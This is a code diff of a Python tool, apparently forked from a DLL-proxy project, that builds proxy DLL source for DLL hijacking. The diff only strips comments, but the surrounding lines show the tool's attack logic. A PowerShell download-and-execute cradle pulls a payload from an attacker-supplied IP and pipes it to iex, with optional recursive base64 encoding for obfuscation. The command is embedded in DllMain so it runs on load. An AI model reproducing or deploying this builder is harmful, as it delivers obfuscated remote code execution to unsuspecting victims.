@@ -4,10 +4,6 @@ import os
 import sys
 import base64
 
-# =======================
-#       ASCII BANNER
-# =======================
-
 banner = r"""
 
                                                                                  __  __  __ 
@@ -28,11 +24,6 @@ forked of: mrexodia         Resource: https://github.com/mrexodia/perfect-dll-pr
 """
 
 print(banner)
-
-
-# =======================
-#   YOUR ORIGINAL CODE
-# =======================
 
 def encode_ps(cmd):
     """Encode command in Base64 UTF-16LE for PowerShell -enc."""
@@ -76,7 +67,7 @@ def main():
     user_downexe: str = args.downexe
     enc_depth: int = args.enc
 
-    # PRIORITY SYSTEM (NO CAMBIADO)
+    # PRIORITY SYSTEM
     if user_downexe:
         user_cmd = (
             f"(New-Object System.Net.WebClient).DownloadString('http://{user_ip}/{user_downexe}') | iex"
@@ -96,7 +87,7 @@ def main():
         user_cmd = "echo NoCommandProvided"
         mode = "none"
 
-    # ENCODING — NO CAMBIADO
+    # ENCODING
     if enc_depth:
         final_ps = recursive_encode_ps(user_cmd, enc_depth)
         final_cmd = f"cmd.exe /c {final_ps}"
@@ -180,7 +171,6 @@ def main():
         for e, o in ordinal_exports:
             f.write(f"#pragma comment(linker, MAKE_EXPORT_ORDINAL(\"{e}\", {o}))\n")
 
-        # ---- DllMain with final command ----
         f.write(f"""
 BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
 {{
@@ -212,10 +202,6 @@ BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
     return TRUE;
 }}
 """)
-
-    # ===============================================
-    #         DESCRIPTIVE OUTPUT SECTION
-    # ===============================================
 
     print(f"[ + ] File provided: {dll}")
 
